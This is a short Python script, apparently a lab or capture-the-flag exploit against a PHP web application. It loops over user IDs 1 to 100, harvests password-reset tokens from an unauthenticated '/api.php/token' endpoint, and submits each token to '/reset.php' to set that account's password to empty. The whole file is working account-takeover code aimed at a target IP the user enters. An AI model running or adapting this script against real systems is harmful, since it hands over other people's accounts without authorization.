#!/usr/bin/env python3
import requests
import time

def get_token(ip):
    url = "http://" + ip + "/api.php/token"
    for i in range(1, 101):
        print(f"Get token for UID: {i}")
        try:
            response = requests.get(f"{url}/{i}", timeout=2)
            token = response.json().get('token')
            if token:
                print(f"Found token: {token} for UID: {i}")
                reset_password(i, token, ip)
            else:
                print(f"Token not found for UID: {i}")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(0.2)

def reset_password(uid, token, ip):
    payload = {
        'uid': uid,
        'token': token,
        'password': ''
    }
    url = "http://" + ip + "/reset.php"
    response = requests.post(url, data=payload)
    if response.status_code == 200 and "Password changed successfully" in response.text:
        print(f"Password changed for UID: {uid}")
    else:
        print(f"Failed changing password for UID: {uid}")

if __name__ == "__main__":
    target_ip = input("IP: ")
    get_token(target_ip)